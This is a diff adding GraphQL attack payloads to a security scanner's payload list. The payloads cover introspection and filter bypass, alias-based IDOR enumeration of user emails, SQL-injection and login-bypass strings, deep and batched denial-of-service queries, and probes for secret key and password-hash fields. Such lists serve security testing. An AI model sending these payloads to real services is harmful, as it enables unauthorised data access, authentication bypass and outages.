@@ -96,3 +96,23 @@ subscription { allEvents { type data } }
 # by GraphQLBatchDoSProber directly — do not add array format here.
 # NOTE: URL paths (/graphql, /api/graphql etc.) and HTTP headers are managed
 # by GraphQLScanner._discover_endpoints(), not this payload list.
+
+# ── [v2026-06] MODERN / ADVANCED ADDITIONS ──
+# tam introspection + tip/argüman keşfi
+{ __schema { queryType { name } mutationType { name } subscriptionType { name } } }
+{ __schema { directives { name args { name } } } }
+{ __type(name:"Query"){ fields { name args { name type { name } } } } }
+{ a:__typename b:__typename c:__typename }
+mutation { __typename }
+# alias tabanlı IDOR brute (tek istekte çok obje)
+{ u1:user(id:1){ id email } u2:user(id:2){ id email } u3:user(id:3){ id email } }
+# enjeksiyon argüman içine
+{ search(q:"' OR 1=1-- "){ id } }
+{ login(user:"admin", password:"\" OR \"1\"=\"1"){ token } }
+# derinlik / batch DoS
+query { posts(first:1000000){ id comments(first:1000000){ id author { posts { id } } } } }
+fragment f on Query { __typename } query { ...f ...f ...f }
+# direktif overloading + introspection filtre bypass
+{ __schema @skip(if:false) { types { name } } }
+# hassas alan keşfi (union/interface)
+{ me { ... on Admin { secretKey } ... on User { passwordHash } } }
